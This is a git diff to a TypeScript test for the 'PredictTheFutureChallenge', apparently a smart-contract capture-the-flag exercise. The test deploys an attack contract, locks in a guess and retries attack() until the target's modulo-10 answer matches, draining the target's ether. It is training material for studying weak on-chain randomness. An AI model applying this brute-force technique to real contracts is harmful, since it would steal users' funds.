@@ -6,6 +6,7 @@ const { utils, provider } = ethers;
 
 describe('PredictTheFutureChallenge', () => {
   let target: Contract;
+  let attackContract : Contract;
   let deployer: SignerWithAddress;
   let attacker: SignerWithAddress;
 
@@ -21,10 +22,7 @@ describe('PredictTheFutureChallenge', () => {
     await target.deployed();
 
     target = target.connect(attacker);
-  });
 
-  it('exploit', async () => {
-    let attackContract : Contract;
     attackContract = await (
       await ethers.getContractFactory('AttackPredictTheFutureChallenge', deployer)
     ).deploy(target.address);
@@ -32,16 +30,22 @@ describe('PredictTheFutureChallenge', () => {
     await attackContract.deployed();
     //Deploy attack contract instance
     attackContract = await attackContract.connect(attacker);
+  });
+
+  it('exploit', async () => {
     expect(await provider.getBalance(attackContract.address)).to.equal(0);
     //Lock in our 'guess'
     const myGuessTx = await attackContract.lockInGuess({value: utils.parseEther('1'),});
     await myGuessTx.wait();
+
+    //answer will be 0-9 because of '% 10', so it is manageable
     while(!(await target.isComplete())){
       try{
         const attackTx = await attackContract.attack();
         await attackTx.wait();
       } catch (err){
-        console.log("Expected error until answer is equal to my guess: ",err);
+        //The attack contract will revert call until answer == myGuess
+        await expect(Promise.reject(err)).to.be.reverted;
       }
     }
     expect(await provider.getBalance(target.address)).to.equal(0);
